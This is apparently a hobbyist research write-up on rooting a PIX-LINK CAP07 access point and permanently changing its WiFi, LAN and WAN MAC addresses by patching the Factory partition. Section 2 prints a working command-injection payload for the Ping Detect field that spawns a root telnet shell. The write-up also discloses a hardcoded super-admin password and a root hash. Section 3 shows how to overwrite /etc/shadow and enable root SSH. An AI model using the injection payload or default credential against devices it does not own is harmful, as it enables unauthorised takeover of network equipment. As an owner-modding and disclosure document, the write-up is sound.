# PIX-LINK CAP07 Access Point: Root Access & MAC Modification Research

This document summarizes the findings, vulnerabilities, and steps taken to gain root access and modify MAC addresses on a PIX-LINK CAP07 (MediaTek MT7915 based) Access Point/Router.

---

## 1. Initial Discoveries & Password Analysis

The following information was discovered by analyzing a **configuration backup** (exported from the web interface), which allowed for offline inspection of some of the filesystem structure.

### Root Password Hash
The original hash found in `/etc/shadow` was:
`root:$1$Vf9S88oO$mPAnS07YJidXlXJ9C9IeS.:18551:0:99999:7:::`
*   **Type:** MD5-based crypt hash (`$1$`).
*   **Salt:** `Vf9S88oO`.

### Configuration Snooping
Analysis of `/etc/config/system` revealed hidden credentials:
```uci
config login 'login'
    option http_user 'admin'
    option super_admin 'Admin2024'  # Hidden (hardcoded) super admin password
    option http_pass 'YourOwnPassword' # Web password set by user
```

---

## 2. Gaining Root Access (The "Ping Hack")

The router's web interface has a Command Injection vulnerability in the **System Tools -> Ping Detect** utility.

### Steps to Reproduce Initial Shell:
1.  Log in to the web interface (http://YOUR-AP-IP or http://wifi6ap.pix-link.net/).
2.  Navigate to **System Tools** -> **Ping Detect**.
3.  In the "IP or Domain Name" field, enter the following payload:
    `8.8.8.8 | telnetd -l /bin/sh -p 2323 & #`
4.  The router executes `ping 8.8.8.8 | telnetd ... -c 1`. The `#` comments out the trailing arguments added by the script.
5.  Access the shell via telnet: `telnet YOUR-AP-IP 2323`.

---

## 3. Achieving Persistence & SSH Access

The router lacks the `passwd` binary, so the password must be changed manually.

### Steps to Change Root Password:
1.  From the telnet shell, use `sed` to overwrite the hash in `/etc/shadow`. 
2.  To set the password to `admin` (hash: `$1$Vf9S88oO$rKs/vJAzGWHeAHoE6lqxs.`), run:
```bash
sed -i 's|root:.*:18551|root:$1$Vf9S88oO$rKs/vJAzGWHeAHoE6lqxs.:18551|' /etc/shadow
```
3.  **Generating your own hash:**
    If you want a different password, you can generate an MD5-based crypt hash on your local machine using `openssl`:
```bash
# Syntax: openssl passwd -1 -salt [SALT] [PASSWORD]
openssl passwd -1 -salt Vf9S88oO YOUR_NEW_PASSWORD
```
    Then replace the hash in the `sed` command above with your newly generated string.

### Steps to Enable Root SSH (Dropbear):
```bash
uci set dropbear.@dropbear[0].PasswordAuth='on'
uci set dropbear.@dropbear[0].RootPasswordAuth='on'
uci commit dropbear
/etc/init.d/dropbear restart
```
*Root can now log in via SSH on port 22.*
ssh -o HostKeyAlgorithms=+ssh-rsa root@YOUR-AP-IP

---

## 4. MAC Address Modification Methods

There are two ways to change the MAC addresses on this device. Understanding the difference is critical, as only one of them affects the WiFi identity.

### Method 1: Runtime Modification (Software Level)
This method involves using scripts (like `/etc/rc.local`) to change the MAC address of the Ethernet interfaces after the system has already booted.

**Payload added to `/etc/rc.local`:**
```bash
ifconfig eth0 down
ifconfig eth0 hw ether 90:91:64:3D:7A:4E
ifconfig eth0 up
uci set network.lan.macaddr="90:91:64:3D:7A:4E"
uci set network.wan.macaddr="90:91:64:3D:7A:4F"
/etc/init.d/network restart
```

**❌ Cons of the Runtime Method:**
*   **No WiFi Support:** This **cannot** change the WiFi (BSSID) MAC addresses. The MediaTek driver reads those directly from the hardware (Factory partition) at load time and ignores software overrides.
*   **Fragile:** If `/etc/rc.local` is overwritten by a firmware update or a factory reset, your changes are lost.
*   **Boot Delay:** The change happens late in the boot process, which can cause brief "MAC flapping" on the network switch.
*   **Incomplete Identity:** The router still "thinks" it has its original identity in many system logs and low-level drivers.

---

### Method 2: Factory Partition Patching (Hardware Level)
This involves directly modifying the `Factory` MTD partition (`/dev/mtd2`), which acts as the "EEPROM" for the device. This is the **only** way to permanently change the WiFi MAC addresses.

**Why this is necessary for WiFi:**
WiFi MAC addresses (ra0, rax0) are hard-coded in the `Factory` partition. Standard commands like `ifconfig ra0 hw ether` return "Not supported" because the driver is locked to this data.

**Factory Partition Offsets Found:**
*   **WiFi Base MAC:** `0x00000004` (The source for all wireless BSSIDs)
*   **LAN MAC:** `0x0003fff4`
*   **WAN MAC:** `0x0003fffa`

---

## 5. How to Apply Permanent (Method 2) Patching

**⚠️ WARNING: HIGH RISK.** An error in patching or writing the Factory partition can brick the device or permanently disable WiFi. ALWAYS keep a backup.

### Option A: Via Web Interface (Super Admin Page) - Recommended for Beginners
1.  Navigate to the hidden Super Admin page: `http://YOUR-AP-IP/#/admin/superadmin`.
2.  Login using the Super Password: `Admin2024` - if this doesn't work, check `/etc/config/system` in your configuration backup.
3.  **Backup:** Click the "backup eeprom" icon (down arrow) to download the current `factory.bin` (this calls `cgi-bin/cgi_stream.cgi?streamid=5`).
4.  **Patch:** Patch the binary locally on your PC (see "Local Patching Steps" below).
5.  **Upload:** Use the "upload eeprom" section. Click "Select Upload File," choose your patched `.bin`, and click "Upload" (this calls `cgi-bin/cgi_stream.cgi?streamid=6`).
6.  The router will reboot automatically.

### Option B: Via SSH/Terminal - For Advanced Users
1.  **Backup:** Run `cat /dev/mtd2 > /tmp/factory.bin`. Transfer to PC via `scp`.
2.  **Patch:** Patch the binary locally on your PC (see below).
3.  **Upload:** Upload the patched `factory.bin` to `/tmp/` on the router.
4.  **Flash:** Run `mtd write /tmp/factory.bin Factory`.
5.  Reboot.

### Local Patching Steps (on PC)
To change the MAC address, overwrite the 6 bytes at the specific offsets found in Section 4.
Example for new WiFi MAC `90:91:64:3D:7A:4A`:

```bash
# WiFi Base MAC Offset: 0x4
printf '\x90\x91\x64\x3D\x7A\x4A' | dd of=factory.bin bs=1 seek=$((0x4)) count=6 conv=notrunc
# LAN MAC Offset: 0x3fff4
printf '\x90\x91\x64\x3D\x7A\x4E' | dd of=factory.bin bs=1 seek=$((0x3fff4)) count=6 conv=notrunc
# WAN MAC Offset: 0x3fffa
printf '\x90\x91\x64\x3D\x7A\x4F' | dd of=factory.bin bs=1 seek=$((0x3fffa)) count=6 conv=notrunc
```

**Verify before uploading:**
It is critical to verify the file is correct before flashing. A corrupted `factory.bin` can disable your WiFi permanently.

1.  **Check File Size:** The file must be exactly the same size as the original backup (usually 262,144 bytes / 256 KB).
    ```bash
    # On macOS/Linux
    ls -l factory.bin
    ```

2.  **Verify WiFi MAC (Offset 0x04):**
    Run this command and look for your new MAC starting at the 5th byte (index 04):
    ```bash
    hexdump -C factory.bin | head -n 1
    # Example output (MAC 90:91:64:3D:7A:4A):
    # 00000000  15 79 00 00 90 91 64 3d  7a 4a 00 0c 43 26 59 97  |.y....d=zJ..C&Y.|
    ```

3.  **Verify LAN/WAN MACs (Offsets 0x3FFF4 and 0x3FFFA):**
    These are at the very end of the file.
    ```bash
    hexdump -C factory.bin | grep "0003fff0"
    # Example output (LAN ...7A:4E, WAN ...7A:4F):
    # 0003fff0  ff ff ff ff 90 91 64 3d  7a 4e 90 91 64 3d 7a 4f  |......d=zN..d=zO|
    ```

4.  **Compare with Original (Optional):**
    If you kept a backup as `factory_orig.bin`, you can see exactly what changed:
    ```bash
    diff <(hexdump -vC factory_orig.bin) <(hexdump -vC factory.bin)
    ```

---

## 6. Interpreting Results & WiFi Analysis

After patching and rebooting, you should verify the changes using a WiFi analysis tool (like WiFi Explorer on macOS or Ubiquiti WiFiman on mobile).

### The "92" vs "90" Mystery (Locally Administered Bit)
If you patch your MAC to start with `90`, you might notice your WiFi analysis tool reports a BSSID starting with `92`. 
*   **Example:** Patched `90:91:64...` results in BSSID `92:91:64...`.
*   **Reason:** This is normal. The router flips the "Locally Administered" bit (the second least significant bit of the first byte) when creating virtual interfaces for different radios (2.4GHz vs 5GHz) or Guest SSIDs. 
*   **Binary:** `0x90` (1001**0**000) becomes `0x92` (1001**0**010).

## 7. Summary of System Info
*   **OS:** OpenWrt (Heavily modified by vendor)
*   **Architecture:** MediaTek (MIPS/ARM based on MT7915)
*   **Hidden Super Admin Page:** Located at `http://YOUR-AP-IP/#/admin/superadmin`, typically requires the `super_admin` password (`Admin2024`) discovered in the config.
*   **MTD Layout:**
    *   `mtd0`: Bootloader
    *   `mtd1`: Config
    *   `mtd2`: Factory (Critical - contains MACs/EEPROM)
    *   `mtd6`: rootfs_data (User changes)
